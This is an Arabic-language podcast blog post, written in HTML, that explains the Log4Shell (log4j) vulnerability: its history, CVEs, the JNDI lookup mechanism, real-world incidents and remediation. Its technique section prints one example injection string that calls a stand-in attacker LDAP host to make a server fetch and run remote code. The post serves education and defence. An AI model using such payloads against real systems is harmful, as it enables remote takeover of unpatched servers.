@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdn.jsdelivr.net/; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+
+
+
+
+<meta name="author" content="حوادث بودكاست">
+<meta name="description" content="الجائحة السيبرانية Log4Shell لوغ4شيل log4shell او ثغرة log4j ,,,, ثغرة هزت عالم الأمن السيبراني. واحدة من اخطر الثغرات في التاريخ والتي اكتشفت قبل عامين ومازال يتم استغلالها الى الان، وهي ثغرات أمنية خطيرة في مكتبة البرمجة &ldquo;لوغ4جي&rdquo; software library المنتشرة بشكل كبير وعنصر اساسي في برمجيات الجافا. تم الكشف عن اسلوب ,وتقنية اختراق هذه الثغرة لأول مرة في مؤتمر &ldquo;بلاك هات&rdquo; عام 2015، لكن تلك المحاضرة لم تحظ بشهرة واسعة وقتها, حيث لم تكتشف ثغرة log4shell الا في عام 2021, عندما قرر احدهم اختراق لعبة &ldquo;ماينكرافت&rdquo; الشهيرة, والمكتوبة بلغة جافا, اي بعد ست سنوات من تبيان اسلوب الاختراق&hellip; ثلاثة بلايين جهاز وسيرفر تعمل بالجافا حول العالم, شكلت هذه الثغرة فشلاً متعدد المستويات في الأمن السيبراني.">
+<meta name="keywords" content="podcast,blog,cybersecurity stories">
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="الحادثة#5:الجائحة السيبرانية لوغ4شيل LOG4SHELL Cyber Pandemic"/>
+<meta name="twitter:description" content="الجائحة السيبرانية Log4Shell لوغ4شيل log4shell او ثغرة log4j ,,,, ثغرة هزت عالم الأمن السيبراني. واحدة من اخطر الثغرات في التاريخ والتي اكتشفت قبل عامين ومازال يتم استغلالها الى الان، وهي ثغرات أمنية خطيرة في مكتبة البرمجة &ldquo;لوغ4جي&rdquo; software library المنتشرة بشكل كبير وعنصر اساسي في برمجيات الجافا. تم الكشف عن اسلوب ,وتقنية اختراق هذه الثغرة لأول مرة في مؤتمر &ldquo;بلاك هات&rdquo; عام 2015، لكن تلك المحاضرة لم تحظ بشهرة واسعة وقتها, حيث لم تكتشف ثغرة log4shell الا في عام 2021, عندما قرر احدهم اختراق لعبة &ldquo;ماينكرافت&rdquo; الشهيرة, والمكتوبة بلغة جافا, اي بعد ست سنوات من تبيان اسلوب الاختراق&hellip; ثلاثة بلايين جهاز وسيرفر تعمل بالجافا حول العالم, شكلت هذه الثغرة فشلاً متعدد المستويات في الأمن السيبراني."/>
+
+<meta property="og:title" content="الحادثة#5:الجائحة السيبرانية لوغ4شيل LOG4SHELL Cyber Pandemic" />
+<meta property="og:description" content="الجائحة السيبرانية Log4Shell لوغ4شيل log4shell او ثغرة log4j ,,,, ثغرة هزت عالم الأمن السيبراني. واحدة من اخطر الثغرات في التاريخ والتي اكتشفت قبل عامين ومازال يتم استغلالها الى الان، وهي ثغرات أمنية خطيرة في مكتبة البرمجة &ldquo;لوغ4جي&rdquo; software library المنتشرة بشكل كبير وعنصر اساسي في برمجيات الجافا. تم الكشف عن اسلوب ,وتقنية اختراق هذه الثغرة لأول مرة في مؤتمر &ldquo;بلاك هات&rdquo; عام 2015، لكن تلك المحاضرة لم تحظ بشهرة واسعة وقتها, حيث لم تكتشف ثغرة log4shell الا في عام 2021, عندما قرر احدهم اختراق لعبة &ldquo;ماينكرافت&rdquo; الشهيرة, والمكتوبة بلغة جافا, اي بعد ست سنوات من تبيان اسلوب الاختراق&hellip; ثلاثة بلايين جهاز وسيرفر تعمل بالجافا حول العالم, شكلت هذه الثغرة فشلاً متعدد المستويات في الأمن السيبراني." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/log4shell/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-23T16:10:13+03:00" />
+<meta property="article:modified_time" content="2023-12-23T16:10:13+03:00" />
+
+
+
+
+  <title>7awadeth Podcast</title>
+
+  
+  <link rel="canonical" href="/posts/log4shell/">
+  
+
+  <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.6b1a4fbc48955b72aea7913e43fabeb45e8bc120da5aa41b598dd33adcac4b59.css" integrity="sha256-axpPvEiVW3Kup5E&#43;Q/q&#43;tF6LwSDaWqQbWY3TOtysS1k=" crossorigin="anonymous" media="screen" />
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-rtl.min.53a38dc0b13401dabe1614c38bdd06d6d37c7957d2b0b3da816339ce8ee88861.css" integrity="sha256-U6ONwLE0Adq&#43;FhTDi90G1tN8eVfSsLPagWM5zo7oiGE=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+  
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css" integrity="sha256-OeQafxa9&#43;MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+   
+
+
+
+
+  <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+  
+
+  <meta name="generator" content="Hugo 0.121.1">
+
+
+  
+
+</head>
+
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-dark rtl">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      7awadeth Podcast
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Cybersecurity Stories</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/news/">News</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="/posts/log4shell/">
+              الحادثة#5:الجائحة السيبرانية لوغ4شيل LOG4SHELL Cyber Pandemic
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2023-12-23T16:10:13&#43;03:00">
+                December 23, 2023
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="الجائحة-السيبرانية-log4shell">
+  الجائحة السيبرانية Log4Shell
+  <a class="heading-link" href="#%d8%a7%d9%84%d8%ac%d8%a7%d8%a6%d8%ad%d8%a9-%d8%a7%d9%84%d8%b3%d9%8a%d8%a8%d8%b1%d8%a7%d9%86%d9%8a%d8%a9-log4shell">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>لوغ4شيل log4shell او ثغرة  log4j ,,,, ثغرة هزت عالم الأمن السيبراني. واحدة من اخطر الثغرات في التاريخ والتي اكتشفت قبل عامين ومازال يتم استغلالها  الى الان، وهي ثغرات أمنية خطيرة في مكتبة البرمجة &ldquo;لوغ4جي&rdquo; software library المنتشرة بشكل كبير وعنصر اساسي في برمجيات الجافا. تم الكشف عن اسلوب ,وتقنية اختراق هذه الثغرة لأول مرة في مؤتمر &ldquo;بلاك هات&rdquo; عام 2015، لكن تلك المحاضرة لم تحظ بشهرة واسعة وقتها, حيث لم تكتشف ثغرة  log4shell الا في عام 2021, عندما قرر احدهم اختراق لعبة &ldquo;ماينكرافت&rdquo; الشهيرة, والمكتوبة بلغة جافا, اي بعد ست سنوات من تبيان اسلوب الاختراق&hellip; ثلاثة بلايين جهاز وسيرفر تعمل بالجافا حول العالم, شكلت  هذه الثغرة فشلاً متعدد المستويات في الأمن السيبراني.</p>
+<p>في هذه الحلقة، سنكتشف كيف أن هذه الثغرة البسيطة في مكتبة شائعة الاستخدام صغيرة الحجم وايضا المفتوحة المصدر open source يمكن أن تشكل تهديدًا هائلا على الأمن السيبراني عالمياً.</p>
+<h1 id="تعريف-بمكتبة-log4j-والثغرة">
+  تعريف بمكتبة log4j والثغرة
+  <a class="heading-link" href="#%d8%aa%d8%b9%d8%b1%d9%8a%d9%81-%d8%a8%d9%85%d9%83%d8%aa%d8%a8%d8%a9-log4j-%d9%88%d8%a7%d9%84%d8%ab%d8%ba%d8%b1%d8%a9">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>لغة الجافا تُعد من أقدم وأشهر لغات البرمجة المستخدمة على مستوى العالم. الشركات تستمر في استثماراتها الضخمة في جافا، حيث يُقدر أن حوالي 70% من الشركات تعمل حالياً على تطوير تطبيقات جافا بشكل كامل. تُستخدم جافا في العديد من المجالات مثل تطبيقات الويب، والموبايل والتطبيقات المؤسسية والمصرفية، الألعاب، تكنولوجيا البيانات الضخمة، التطبيقات العلمية وغيرها. وفقاً لتقرير من شركة veracode العالمية، في عام 2021، كان 88% من الشركات حول العالم تستخدم تطبيقات JAVA تحتوي على مكتبة log4j، مما يبرز مدى الانتشار الواسع لهذه اللغة وأهميتها.</p>
+<p>لوغ4جي عبارة عن مكتبة برمجية او بكلمات اخرى قطعة من الكود المستخدمة والمشتركة بين معظم برامج الجافا  لتدوين السجلات, لذلك نطاق هذه الثغرة ضخم جدا ولا يمكن حصره بشكل عام. وفقا لتقديرات مجتمعات الامن السيبراني على البرامج الضخمة والمؤسسية فانه يقدر ان هناك 250 مزود خدمة عالمي و 1142 منتج عالمي متأثر بهذه الثغرة, يمكن القول ان معظم منتجات الشركات الكبيرة تاثرت ك oracle vmware cisco Amazon Microsoft IBM  وغيرها, وايضا معظم البرامج التي تستخدم لغة الجافا تأثرت. بسبب هذا الانتشار الضخم مازالت هذه الثغرة هدفا للعدبد من الهحمات الى اليوم. كما اكتشف مؤخرا ان المجموعة الشهيرة لازاروس تستخدم هذه الثغرة لتحميل برامج تجسس ضارة.</p>
+<p>تعتبر مكتبة &ldquo;لوغ4جي&rdquo;، التي طورها سيكي جولكو في عام 2001، واحدة من أبرز مشاريع مؤسسة أباتشي للبرمجيات المفتوحة المصدر. تلعب هذه المكتبة دورًا حيويًا في عالم البرمجة بفضل قدرتها على تسجيل البيانات المختلفة داخل التطبيقات  service logging، مما يجعلها أداة لا غنا عنها لمطوري الجافا. وعلى الرغم من ظهور أطر عمل جديدة للتسجيل، إلا أن &ldquo;لوغ4جي&rdquo; ما زالت تحتفظ بشعبيتها الواسعة نظرًا لموثوقيتها وسهولة استخدامها. وقد اكتسبت هذه المكتبة شهرة عالمية بعد اكتشاف ثغرات &ldquo;لوغ4شيل&rdquo; من قبل تشن تشاوجون من فريق أمن السحابة في شركة علي بابا، حيث أثارت هذه الثغرة الأمنية ضجة كبيرة في عالم الأمن السيبراني وتعين لها تقييم 10.0 للثغرة الاولى كثغرة حرجة الحطورة على معيار CVSS وأصبحت محور تركيز العديد من المؤسسات الأمنية والمقالات التحليلية.</p>
+<p>يجب الاشارة ايضا ان ثغرة لوج4جي هي سلسلة ومجموعة ثغرات ظهرت بشكل متتابع في تلك الفترة في ديسيمبر من عام 2021 وتحمل الارقام ودرجات الخطورة التالية</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>الوصف</th>
+<th>نسخة الإصلاح</th>
+<th>معدل CVSS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2021-44228</td>
+<td>تنفيذ كود عن بُعد عبر ميزات JNDI. تم تعطيل هذا السلوك بشكل افتراضي في 2.15.0 وتمت إزالته بالكامل في الإصدارات 2.16.0 وما بعدها.</td>
+<td>2.15.0</td>
+<td>10.0</td>
+</tr>
+<tr>
+<td>CVE-2021-45046</td>
+<td>ثغرة تسمح بتسرب المعلومات أو تنفيذ الكود عن بُعد في بعض الإعدادات. تم إصلاحها في 2.16.0 و 2.12.2.</td>
+<td>2.16.0</td>
+<td>9.0</td>
+</tr>
+<tr>
+<td>CVE-2021-45105</td>
+<td>إنكار الخدمة من خلال حلقة تكرار لا نهاية. تم إصلاحها في الإصدار 2.17.0.</td>
+<td>2.17.0</td>
+<td>5.9</td>
+</tr>
+<tr>
+<td>CVE-2021-44832</td>
+<td>هجوم تنفيذ كود عن بُعد عند استخدام JDBC Appender مع URI لمصدر بيانات JNDI LDAP. تم إصلاحها بتحديد أسماء مصادر البيانات JNDI إلى بروتوكول java في الإصدارات 2.17.1 وما بعدها.</td>
+<td>2.17.1</td>
+<td>8.5</td>
+</tr>
+<tr>
+<td>CVE-2021-4104</td>
+<td>تنفيذ كود عن بُعد عبر JMSAppender في Log4j 1.2. يؤثر فقط على Log4j 1.2 عند تكوينها خصيصًا لاستخدام JMSAppender.</td>
+<td>-</td>
+<td>7.5</td>
+</tr>
+</tbody>
+</table>
+<p>لوغ4شيل&quot;، التي تم الكشف عنها رسميًا في <em>9 ديسمبر 2021</em>، هي ثغرة تنفيذ الاوامر عن بُعد (RCE) تؤثر على مكتبة &ldquo;لوغ4جي&rdquo; من الإصدار 2.0 إلى 2.14.1. تكمن الثغرة في كيفية خدمة التسجيل logging مع خاصية في الجافا تسمى JNDI  الخاصة بالأسماء والدليل في جافا.</p>
+<p>حيث ان تفعيل خاصية JNDI على مكتبة التسجيل log4j ادى الى انشاء هذه الثغرة حبث اصبحت المتغيرات الخاصة ب JNDI يمكن التحكم بها من خلال المستخدم او المخترق.  الوظيفة الاساسية لمكتبات التسجيل كلوغ4جيه هي تسجيل البيانات ومنها بشكل كبير ما يرد من عمليات استخدام للتطبيق تنشء من خلال المستخدم,  لكن مع تفعيل JNDI اصبح يمكن تنفيذ اوامر من خلال عملية التسجيل http logging!</p>
+<p>خاصية JNDI (Java Naming and Directory Interface) في جافا هي واجهة برمجة تسمح بالوصول إلى خدمات الأسماء والدليل في تطبيقات جافا يمكن تشبيهها بدليل الهاتف او DNS لاستبدال الاسماء بارقام او رموز. تُستخدم للبحث والاستعلام عن البيانات والموارد داخل البرامج، مثل البحث  في قاعدة بيانات LDAP أو الوصول إلى موارد JMS. كان من السهل نسبيًا على المهاجمين استغلال هذه الثغرة، مما أدى إلى تعرض العديد من الأنظمة للاختراق بسرعة كبيرة</p>
+<p>لمعالجة هذه الثغرة، تم إصدار تحديثات لمكتبة Log4j تمنع استدعاء الرسائل المسجلة كأوامر JNDI. اصلاح ثغرات لوغ4شيل كلف مئات الملايين من الدولارات بسبب الانتشار الضخم ووفقا لبعض التقارير ان 58% من المؤسسات والشركات قد اصيبت بهذه الثغرة من برامج الجافا!</p>
+<p>يتضح أن السبب الرئيسي لثغرة لوغ4شيل يعود إلى التصميم غير الآمن لخاصية التسجيل في مكتبة الجافا. كانت محاولات تعقيد تصميم عملية التسجيل، التي كان ينبغي أن تتعلق بوظيفة محددة وبسيطة، سببًا في فتح باب الثغرة. لم يكن هناك حاجة لإضافة ميزات جديدة خارج نطاق وظيفة التسجيل الأساسية. المشكلة كانت في الخلط بين وجود البيانات المجردة Data والأوامر التي يمكن تنفيذها commands في نفس المكان، أي في ملفات التسجيل log files. هذا التداخل يمثل خللاً كبيرًا في التصميم، مما أدى إلى هذه الثغرة الأمنية الكبيرة.</p>
+<h1 id="التسلسل-الزمني-لثغرة-log4shell">
+  التسلسل الزمني لثغرة log4shell
+  <a class="heading-link" href="#%d8%a7%d9%84%d8%aa%d8%b3%d9%84%d8%b3%d9%84-%d8%a7%d9%84%d8%b2%d9%85%d9%86%d9%8a-%d9%84%d8%ab%d8%ba%d8%b1%d8%a9-log4shell">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>1- <strong>2002</strong>: تم إنشاء مكتبة Log4j بواسطة Ceki Gülcü لتصبح المكتبة الاكثر استخداما في جافا
+2- <strong>2013:</strong> تم انشاء كود ضار يسمح بعمليات البحث JNDI في Log4j النسخة رقم 2.0
+3- <strong>2014:</strong> قدم Log4j خيار الاعداد لتعطيل عمليات البحث JNDI بسبب المخاوف الأمنية!
+4- <strong>2021 نوفيمبر</strong>: اكتشاف الثغرة من قبل الباحث في شركة علي بابا الصينية من غير اعلان رسمي عنها وارسلت لفرق اباتشي لاصلاحها للتبليغ عن الثغرة بشكل مسؤول, ظهرت شائعات في اواخر نوفيمبر على وجود ثغرة حرجة تمكن من اختراق لعبة ماينكرافت الشهيرة.
+4- <strong>2021 ديسيمبر:</strong> تم الاعلان الرسمي عنها وتقديم تصحيح معالج لها في ديسيمبر.</p>
+<h1 id="تقنية-الاختراق">
+  تقنية الاختراق
+  <a class="heading-link" href="#%d8%aa%d9%82%d9%86%d9%8a%d8%a9-%d8%a7%d9%84%d8%a7%d8%ae%d8%aa%d8%b1%d8%a7%d9%82">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>يمكن للمهاجم استغلال &ldquo;لوغ4شيل&rdquo; من خلال إرسال اكسبلويت كود استغلال معد بشكل خاص إلى نظام مطور بالجافا يتسبب في تنفيذ النظام للاوامر عن بعد لتعطي المخترق تحكم كامل على الاجهزة المصابة. يسمح هذا الطلب للمهاجم بالسيطرة الكاملة على النظام، ومن ثم يمكنه سرقة المعلومات، نشر برامج الفدية، أو القيام بأنشطة ضارة أخرى. هذا الاكسبلويت لا يتطلب صلاحيات دخول لتنفيذه اي من نوع unauthenticated RCE.</p>
+<p>يعمل الاكسبلويت على حقن ملفات التسجيل log files بارسال طلبات  مصممة خصيصًا في رسالة سجل يتم معالجتها بواسطة Log4j تقوم بتفعيل خاصية JNDI. يقوم بتنزيل وتنفيذ تعليمات برمجية ضارة ويعطي تحكم عن بعد للمخترق.</p>
+<p>بعد عملية الحقن الناجح لملفات السجل تصبح الثغرة من نوع Insecure Deserialization. يكثر في الجافا استخدام تقنية serialization / deserialization بكثرة في عملية تناقل المعلومات بين البرامج المنفصلة, خصوصا في تناقل معلومات على شكل Object في object oriented programming حيث عند استقبال المعلومات من طرف خارجي وعدم التحقق وفحصها امنيا, يؤدي ذلك لاضرار كبيرة علر البرمجيات. لتتخيل معي السيناريو التالي الذي يمكن استعارته للتشبيه بهذا النوع من الهجوم:</p>
+<p>يشبه إلى حد ما فتح صندوق البريد، ولكنه يحدث مع البرامج والبيانات بدلاً من الرسائل الورقية. البرنامج يتلقى &ldquo;طردًا&rdquo; من برنامج آخر يحتوي على بيانات، ويقوم &ldquo;بفتح الطرد&rdquo; واستخراج المعلومات واستخدامها. <strong>الثغرة:</strong> تكمن المشكلة في أنه إذا كان &ldquo;الطرد&rdquo; مصمماً بشكل خبيث، فقد يحتوي على تعليمات ضارة مخفية بجانب البيانات المهمة. وعندما يفتح البرنامج الطرد ويستخرج المعلومات، قد ينفذ أيضًا التعليمات الضارة دون قصد، مما يمنح المهاجم السيطرة على النظام.</p>
+<p>يعمل الهجوم عن طريق حقن سلسلة او ارسال طرد من خلال JNDI.</p>
+<ol>
+<li><strong>يقوم المهاجم بإدخال بحث JNDI في موقع من المحتمل تسجيله من قبل التطبيق, مثلا HTTP Header.</strong> على سبيل المثال ، قد يضيف المهاجم السلسلة <code>${jndi:ldap://evil.xa/x}</code> على المكان الخاص في معلومة http agent</li>
+<li><strong>يتم تمرير السلسلة إلى Log4j للتسجيل.</strong></li>
+<li><strong>يستدعي Log4j السلسلة ويستعلم خادم LDAP الضار الذي قام بتسجيله.</strong>  <code>ldap://evil.xa/x</code> ، وهو طلب إلى خادم LDAP في موقع متحكم به من قبل هاكر evil.xa.</li>
+<li><strong>يستجيب خادم LDAP بمعلومات دليل تحتوي على فئة Java الضارة معد خصيصا لارسال serialized object ضار.</strong></li>
+<li><strong>يقوم برنامج الجافا باستقبال الكود الضار وتنفيذه.</strong></li>
+</ol>
+<p>سنكتفي بهذا القدر من التحليل التقني للثغرة لتناسب الشريحة الاكبر من المستمعين, بامكانكم الرجوع للتالي للاستزادة بكيفية فحص واستغلال الثغرة</p>
+<p>هناك عدد من الخطوات التي يمكن القيام بها لمعالجة ثغرة Log4Shell ، بما في ذلك:</p>
+<ul>
+<li><strong>تحديث Log4j إلى إصدار آمن.</strong> أصدرت مؤسسة Apache Software Foundation عددًا من الإصدارات المحمية من Log4j. يمكنك العثور على مزيد من المعلومات حول كيفية تحديث Log4j على موقع Apache الإلكتروني.</li>
+<li><strong>تعطيل عمليات البحث JNDI في Log4j.</strong> يمكنك تعطيل عمليات البحث JNDI في Log4j عن طريق تعيين الخاصية system <code>log4j2.format.lookup.disabled</code> إلى <code>true</code>.</li>
+<li><strong>منع الهجوم باستخدام جدار حماية تطبيق الويب (WAF).</strong> يمكن استخدام WAF لمنع الهجوم عن طريق منع تمرير السلاسل الضارة إلى Log4j.</li>
+</ul>
+<h1 id="تاثير-وتداعيات-الثغرة">
+  تاثير وتداعيات الثغرة
+  <a class="heading-link" href="#%d8%aa%d8%a7%d8%ab%d9%8a%d8%b1-%d9%88%d8%aa%d8%af%d8%a7%d8%b9%d9%8a%d8%a7%d8%aa-%d8%a7%d9%84%d8%ab%d8%ba%d8%b1%d8%a9">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>لا يمكن حصر الضرر الذي نتج او قد يحصل من هذه الثغرة الواسعة الانتشار, ثغرة لوغ4شيل تتطلب جهدا معين لاصلاحها الذي كلف مئات ملايين الدولارات , وهي سهلة الاختراق المباشر, مما يبرز الطبيعة الممتدة للتهديد لذلك يتوقع ان يبقى اثرها وضررها قائما لسنوات عديدة. هجمات ضخمة متعلقة رصدت في الايام الاولى عقب الافصاح عن الثغرة ، لكن ابرز الحوادث التي نتجت:</p>
+<p>استخدام الثغرة في تعدين العملات الرقمية وأنشطة البوت نت: استخدم القراصنة ثغرة Log4Shell في أنشطة غير قانونية مثل تعدين العملات الرقمية، وإنشاء شبكات البوت نت كبيرة، وتنفيذ هجمات الفدية. وأشارت عدة تقارير  إلى النطاق الواسع لهذه الهجمات في الأيام التالية لكشف الثغرة​​.</p>
+<p>هجمات على مؤسسات حكومية ودفاعية:
+تم الإبلاغ عن هجوم على وزارة الدفاع البلجيكية باستخدام ثغرة Log4Shell من قبل كاسبرسكي. لم يتم الكشف عن تفاصيل الهجوم، ولكن الحادثة أبرزت الأثر المحتمل للثغرة على الأمن القومي​​.
+تم ذكر هجوم على شبكة حكومية أمريكية من قبل مخترقين سيبرانيين من ايران باستخدام Log4Shell.</p>
+<p>ظهر هذا الشهر  ديسمبر من عام ٢٠٢٣ تقرير حديث ان مجموعة لازاروس المدعومة من حكومة كوريا الشمالية تشن هجمات تستهدف منظمات التصنيع والزراعة والأمن المادي التي لم تقم بإصلاح الثغرات في Log4j حتى الآن. على الرغم من توفر التصحيح قبل عامين، فإن ثغرة Log4Shell ما زالت نقطة انطلاق شائعة حتى بالنسبة للجهات المتقدمة.  تم استغلال الثغرة من قبل المجموعة الكورية على VMware Horizon غير المصححة واستخدموا وصولهم لنشر برمجيات تجسسية</p>
+<p>يجب الاشارة ان عملية الاستجابة لحادثة لوغ٤جي وتفعيل خطط الاستجابة للحوادث السيبرانية كان على مستواً عال بالاجمال سواءً من الحكومات ومجتمع الامن السيبراني والهيئات الارشادية والشركات. وهذا ادى لاستجابة سريعة وتعاون مشترك بين مختلف المنظمات مما ادى للتقليل من الخطر الناجم في وقتها لكن كما ذكرنا ما زال الخطر من هكذا نوع من الثغرات قائما.</p>
+<h1 id="الخاتمة">
+  الخاتمة
+  <a class="heading-link" href="#%d8%a7%d9%84%d8%ae%d8%a7%d8%aa%d9%85%d8%a9">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>في تقرير أصدرته وزارة الأمن الداخلي الأمريكية، تم تسليط الضوء على عدة مشكلات نظامية في مجتمع البرمجيات مفتوحة المصدر، والتي ساهمت في ثغرة Log4j:</p>
+<ol>
+<li>
+<p><strong>نقص الممارسات الآمنة</strong>: تفتقر العديد من مشاريع البرمجيات مفتوحة المصدر إلى ممارسات آمنة موحدة في عملية تطوير البرمجيات، مما يمكن أن يؤدي إلى ظهور ثغرات أمنية.</p>
+</li>
+<li>
+<p><strong>موارد محدودة</strong>: تعمل الكثير من مشاريع البرمجيات مفتوحة المصدر بموارد مالية وبشرية محدودة، مما يؤثر على قدرتها على تنفيذ تدابير أمان قوية ومراقبة وتحديث البرمجيات بشكل مستمر.</p>
+</li>
+</ol>
+<p>نظرًا لاستخدام البرمجيات مفتوحة المصدر على نطاق واسع، فإن الدعم والموارد المخصصة للحفاظ على أمان هذه المشاريع غالبًا ما تكون غير كافية. هذا يخلق ثغرات أمنية يمكن أن يكون لها تأثيرات واسعة النطاق، كما في حالة Log4j. يشير التقرير إلى ضرورة بذل جهود جماعية من قبل القطاعين العام والخاص لتوفير دعم وموارد أفضل لأمان البرمجيات مفتوحة المصدر. بدأت العديد من الشركات الكبرى مثل جوجل ومايكروسوفت في تخصيص الدعم وتبني المنظمات التي تدعم حماية البرمجيات مفتوحة المصدر مثل OWASP وOpenSSF.</p>
+<p>أخيرًا، عانت العديد من المؤسسات في تحديد ثغرة لوغ4شيل في أنظمتها بسبب ضعف إدارة الأصول Asset Management، وخصوصًا تلك التي تفتقر إلى ممارسات مثل SBOM (قائمة مكونات البرمجيات). واجهت هذه المؤسسات صعوبات في تحديد الأنظمة المتأثرة بسرعة، مما أدى إلى تأخير في تحديد وتقييم وتخفيف مخاطر Log4Shell، مما تسبب في عواقب وخيمة.</p>
+<p>References</p>
+<p><a href="https://www.veracode.com/blog/research/state-log4j-vulnerabilities-how-much-did-log4shell-change">https://www.veracode.com/blog/research/state-log4j-vulnerabilities-how-much-did-log4shell-change</a>
+<a href="https://www.veracode.com/blog/security-news/58-orgs-are-using-vulnerable-version-log4j">https://www.veracode.com/blog/security-news/58-orgs-are-using-vulnerable-version-log4j</a>
+<a href="https://www.zdnet.com/article/belgian-defense-ministry-confirms-cyberattack-through-log4j-exploitation/">https://www.zdnet.com/article/belgian-defense-ministry-confirms-cyberattack-through-log4j-exploitation/</a>
+<a href="https://www.csoonline.com/article/1259949/lazarus-apt-attack-campaign-shows-log4shell-exploitation-remains-popular.html">https://www.csoonline.com/article/1259949/lazarus-apt-attack-campaign-shows-log4shell-exploitation-remains-popular.html</a>
+<a href="https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know">https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know</a>
+<a href="https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9">https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9</a>
+<a href="https://www.theregister.com/2023/12/11/log4j_vulnerabilities/">https://www.theregister.com/2023/12/11/log4j_vulnerabilities/</a>
+<a href="https://securitylabs.datadoghq.com/articles/log4j-log4shell-vulnerability-overview-and-remediation/">https://securitylabs.datadoghq.com/articles/log4j-log4shell-vulnerability-overview-and-remediation/</a>
+<a href="https://www.seanmackert.com/blog/why-there-is-no-log4j-worm/">https://www.seanmackert.com/blog/why-there-is-no-log4j-worm/</a>
+<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a>
+<a href="https://www.youtube.com/watch?v=iI9Dz3zN4d8&amp;t=341s&amp;pp=ygUSbGl2ZW92ZXJmbG93IGxvZzRq">https://www.youtube.com/watch?v=iI9Dz3zN4d8&amp;t=341s&amp;pp=ygUSbGl2ZW92ZXJmbG93IGxvZzRq</a>
+<a href="https://www.youtube.com/watch?v=w2F67LbEtnk&amp;t=80s">https://www.youtube.com/watch?v=w2F67LbEtnk&amp;t=80s</a></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2022 -
+    
+    2023
+     حوادث بودكاست 
+    ·
+    
+    
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  
+  <script src="/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js" integrity="sha256-I2BJOV3DaC&#43;ycZZAhylY4S8fJAZ7sJwyeyM&#43;YpDH7aw="></script>
+  
+
+  
+
+  
+
+  
+
+  
+
